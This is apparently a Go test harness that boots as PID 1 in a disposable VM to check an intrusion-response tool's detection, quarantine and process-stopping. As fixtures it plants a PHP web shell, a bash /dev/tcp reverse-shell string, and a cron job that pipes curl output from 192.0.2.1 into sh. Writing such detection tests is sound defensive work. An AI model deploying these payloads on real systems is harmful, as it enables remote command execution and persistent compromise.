//go:build linux

// Command vmtest is PID 1 in a throwaway guest, for scripts/vm-respond.sh. It drives
// the real cau binary, as real root, over a real kernel: the response path that a
// fixture /proc can only imitate. Everything it touches dies with the VM.
package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

const shell = "<?php system($_GET['c']); ?>\n"

var passed, failed int

func check(name string, ok bool, detail string) {
	state := "PASS"
	if ok {
		passed++
	} else {
		failed++
		state = "FAIL"
	}
	fmt.Printf("VMRESP %s %-44s %s\n", state, name, detail)
}

type report struct {
	Incident struct {
		Confirmed bool     `json:"confirmed"`
		Why       string   `json:"why"`
		Files     []string `json:"files"`
		PIDs      []int    `json:"pids"`
		Layers    []string `json:"layers"`
		Signals   []struct {
			Class string `json:"class"`
		} `json:"signals"`
	} `json:"incident"`
	Actions []string `json:"actions"`
}

type daemon struct {
	cmd  *exec.Cmd
	mu   sync.Mutex
	seen []report
	raw  []string
}

func start(args ...string) *daemon {
	base := []string{"defend", "--interval", "1s", "--format", "json", "--rules", "/share/rules", "--db", "/share/signatures/hashes.txt",
		"--package-interval", "0", "--kernel-bin", "/no/such/cau-kernel", "--quarantine-store", "/var/lib/cau/vault"}
	d := &daemon{cmd: exec.Command("/bin/cau", append(base, args...)...)}
	stdout, _ := d.cmd.StdoutPipe()
	stderr, _ := d.cmd.StderrPipe()
	if err := d.cmd.Start(); err != nil {
		panic(err)
	}
	ready := make(chan struct{})
	var once sync.Once
	go func() {
		sc := bufio.NewScanner(stderr)
		for sc.Scan() {
			fmt.Println("VMLOG", sc.Text())
			if strings.Contains(sc.Text(), "scan workers") {
				once.Do(func() { close(ready) })
			}
		}
	}()
	go func() {
		sc := bufio.NewScanner(stdout)
		sc.Buffer(make([]byte, 1<<20), 1<<24)
		for sc.Scan() {
			var r report
			if json.Unmarshal(sc.Bytes(), &r) == nil {
				d.mu.Lock()
				d.seen = append(d.seen, r)
				d.raw = append(d.raw, sc.Text())
				d.mu.Unlock()
			}
		}
	}()
	select {
	case <-ready:
	case <-time.After(60 * time.Second):
		fmt.Println("VMLOG daemon never became ready")
	}
	time.Sleep(1500 * time.Millisecond)
	return d
}

func (d *daemon) any(pred func(report) bool) bool {
	d.mu.Lock()
	defer d.mu.Unlock()
	for _, r := range d.seen {
		if pred(r) {
			return true
		}
	}
	return false
}

func (d *daemon) stop() (int, time.Duration) {
	t := time.Now()
	_ = d.cmd.Process.Signal(syscall.SIGTERM)
	done := make(chan error, 1)
	go func() { done <- d.cmd.Wait() }()
	select {
	case <-done:
		return d.cmd.ProcessState.ExitCode(), time.Since(t)
	case <-time.After(20 * time.Second):
		_ = d.cmd.Process.Kill()
		return -1, time.Since(t)
	}
}

func until(limit time.Duration, ok func() bool) bool {
	end := time.Now().Add(limit)
	for time.Now().Before(end) {
		if ok() {
			return true
		}
		time.Sleep(20 * time.Millisecond)
	}
	return ok()
}

func gone(p string) bool { _, err := os.Lstat(p); return os.IsNotExist(err) }

func state(pid int) string {
	b, err := os.ReadFile(fmt.Sprintf("/proc/%d/stat", pid))
	if err != nil {
		return "gone"
	}
	f := strings.Fields(string(b[strings.LastIndexByte(string(b), ')')+1:]))
	return f[0]
}

func write(p, body string, mode os.FileMode) {
	if err := os.WriteFile(p, []byte(body), mode); err != nil {
		panic(err)
	}
}

func copyFile(src, dst string) {
	in, _ := os.Open(src)
	defer in.Close()
	out, err := os.OpenFile(dst, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o755)
	if err != nil {
		panic(err)
	}
	defer out.Close()
	_, _ = io.Copy(out, in)
}

var listener net.Listener

// socketed starts a program whose stdin and stdout really are a TCP connection,
// which is what makes a shell a remote shell to the kernel.
func socketed(path string, args ...string) (*exec.Cmd, net.Conn) {
	conn, err := net.Dial("tcp", listener.Addr().String())
	if err != nil {
		panic(err)
	}
	f, _ := conn.(*net.TCPConn).File()
	c := exec.Command(path, args...)
	c.Stdin, c.Stdout = f, f
	if err := c.Start(); err != nil {
		panic(err)
	}
	go func() { _ = c.Wait() }()
	return c, conn
}

func links(ifname string) {
	fd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_DGRAM, 0)
	defer syscall.Close(fd)
	var req [40]byte
	copy(req[:], ifname)
	*(*uint16)(unsafe.Pointer(&req[16])) = syscall.IFF_UP
	_, _, _ = syscall.Syscall(syscall.SYS_IOCTL, uintptr(fd), syscall.SIOCSIFFLAGS, uintptr(unsafe.Pointer(&req[0])))
}

func setup() {
	for _, m := range []struct{ src, dst, typ string }{{"proc", "/proc", "proc"}, {"sysfs", "/sys", "sysfs"}, {"devtmpfs", "/dev", "devtmpfs"}} {
		_ = os.MkdirAll(m.dst, 0o755)
		_ = syscall.Mount(m.src, m.dst, m.typ, 0, "")
	}
	for _, d := range []string{"/tmp", "/run", "/var/www", "/var/tmp", "/srv", "/etc/cron.d", "/var/lib/cau", "/root/.ssh", "/usr/bin", "/var/log", "/dev/shm"} {
		_ = os.MkdirAll(d, 0o755)
	}
	write("/etc/passwd", "root:x:0:0:root:/root:/bin/sh\n", 0o644)
	links("lo")
	var err error
	if listener, err = net.Listen("tcp", "127.0.0.1:4444"); err != nil {
		panic(err)
	}
	go func() {
		for {
			if c, err := listener.Accept(); err == nil {
				defer c.Close()
				go func() { _, _ = io.Copy(io.Discard, c) }()
			} else {
				return
			}
		}
	}()
}

func reportOnly() {
	d := start("--report-only")
	write("/var/www/ro.php", shell, 0o644)
	write("/etc/cron.d/ro", "* * * * * root /var/tmp/x /var/www/ro.php\n", 0o644)
	ok := until(15*time.Second, func() bool {
		return d.any(func(r report) bool {
			return r.Incident.Confirmed && strings.Contains(strings.Join(r.Incident.Files, " "), "ro.php")
		})
	})
	check("report-only: incident is confirmed", ok, "")
	check("report-only: the file was left alone", !gone("/var/www/ro.php"), "")

	// What the watcher used to miss, on the real kernel.
	write("/run/src.php", shell, 0o644)
	err := os.Link("/run/src.php", "/var/www/linked.php")
	seenLink := until(10*time.Second, func() bool {
		return d.any(func(r report) bool { return strings.Contains(strings.Join(r.Incident.Files, " "), "linked.php") })
	})
	check("watcher: a hard link is seen", err == nil && seenLink, fmt.Sprint(err))

	f, _ := os.Create("/var/www/sparse")
	terr := f.Truncate(1 << 50)
	f.Close()
	t := time.Now()
	sparse := until(5*time.Second, func() bool {
		return d.any(func(r report) bool {
			for _, s := range r.Incident.Signals {
				if s.Class == "file.too-large" {
					return true
				}
			}
			return false
		})
	})
	check("scanner: a 1 PiB sparse file does not wedge it", terr == nil && sparse, time.Since(t).Round(time.Millisecond).String())

	code, took := d.stop()
	check("report-only: SIGTERM exits 0", code == 0, took.Round(time.Millisecond).String())
	for _, p := range []string{"/var/www/ro.php", "/etc/cron.d/ro", "/var/www/linked.php", "/var/www/sparse", "/run/src.php"} {
		_ = os.Remove(p)
	}
}

func defaults() {
	d := start()

	write("/var/www/shell.php", shell, 0o644)
	write("/etc/cron.d/job", "* * * * * root /var/tmp/x /var/www/shell.php\n", 0o644)
	check("defaults: confirmed file is really quarantined", until(15*time.Second, func() bool { return gone("/var/www/shell.php") }), "")
	vault, _ := filepath.Glob("/var/lib/cau/vault/*/*")
	check("defaults: the bytes are in the vault", len(vault) >= 1, fmt.Sprint(len(vault), " blob(s)"))
	check("defaults: the action is reported", until(5*time.Second, func() bool {
		return d.any(func(r report) bool {
			return strings.Contains(strings.Join(r.Actions, " "), "quarantined /var/www/shell.php")
		})
	}), "")
	check("defaults: the cron table is never touched", !gone("/etc/cron.d/job"), "")

	write("/var/www/shell.php", shell, 0o644)
	check("defaults: a re-dropped file is quarantined again", until(15*time.Second, func() bool { return gone("/var/www/shell.php") }), "")

	copyFile("/init", "/var/www/bash")
	shellProc, c1 := socketed("/var/www/bash", "sleep-forever")
	stopped := until(15*time.Second, func() bool { return state(shellProc.Process.Pid) == "T" })
	check("defaults: a shell on a socket is really stopped", stopped, "state "+state(shellProc.Process.Pid))

	copyFile("/init", "/var/www/sh")
	del, c2 := socketed("/var/www/sh", "sleep-forever")
	_ = os.Remove("/var/www/sh")
	check("defaults: a deleted binary on a socket is stopped", until(15*time.Second, func() bool { return state(del.Process.Pid) == "T" }), "state "+state(del.Process.Pid))

	copyFile("/init", "/usr/bin/grep")
	text := exec.Command("/usr/bin/grep", "-e", "bash -i >& /dev/tcp/192.0.2.1/443 0>&1", "notes.txt", "sleep-forever")
	_ = text.Start()
	go func() { _ = text.Wait() }()
	pid := text.Process.Pid
	alerted := until(10*time.Second, func() bool {
		return d.any(func(r report) bool {
			for _, p := range r.Incident.PIDs {
				if p == pid {
					return true
				}
			}
			return false
		})
	})
	time.Sleep(3 * time.Second)
	check("defaults: argv text alone is reported", alerted, "")
	check("defaults: argv text alone is never stopped", state(pid) == "S" || state(pid) == "R", "state "+state(pid))

	write("/etc/cron.d/evil", "* * * * * root curl http://192.0.2.1/x | sh\n", 0o644)
	time.Sleep(4 * time.Second)
	check("defaults: nothing under /etc is quarantined", !gone("/etc/cron.d/evil"), "")

	check("defaults: PID 1 is alive and unsignalled", state(1) == "R" || state(1) == "S", "state "+state(1))
	code, took := d.stop()
	check("defaults: SIGTERM exits 0", code == 0, took.Round(time.Millisecond).String())

	for _, p := range []*exec.Cmd{shellProc, del, text} {
		_ = p.Process.Signal(syscall.SIGKILL)
		_ = p.Process.Signal(syscall.SIGCONT)
	}
	_ = c1.Close()
	_ = c2.Close()
	_ = os.Remove("/etc/cron.d/job")
	_ = os.Remove("/etc/cron.d/evil")
}

func kill() {
	d := start("--respond", "kill")
	copyFile("/init", "/var/www/dash")
	p, c := socketed("/var/www/dash", "sleep-forever")
	pid := p.Process.Pid
	check("--respond kill: the shell is really dead", until(15*time.Second, func() bool {
		s := state(pid)
		return s == "gone" || s == "Z"
	}), "state "+state(pid))
	code, _ := d.stop()
	check("--respond kill: SIGTERM exits 0", code == 0, "")
	_ = c.Close()
}

func main() {
	if os.Getpid() != 1 {
		for _, a := range os.Args[1:] {
			if a == "sleep-forever" {
				for {
					time.Sleep(time.Hour)
				}
			}
		}
		return
	}
	defer func() {
		if r := recover(); r != nil {
			fmt.Println("VMRESP FAIL harness panic:", r)
			failed++
		}
		fmt.Printf("VMRESP RESULT passed=%d failed=%d uid=%s\n", passed, failed, strconv.Itoa(os.Getuid()))
		syscall.Sync()
		_ = syscall.Reboot(syscall.LINUX_REBOOT_CMD_POWER_OFF)
	}()
	setup()
	reportOnly()
	defaults()
	kill()
}
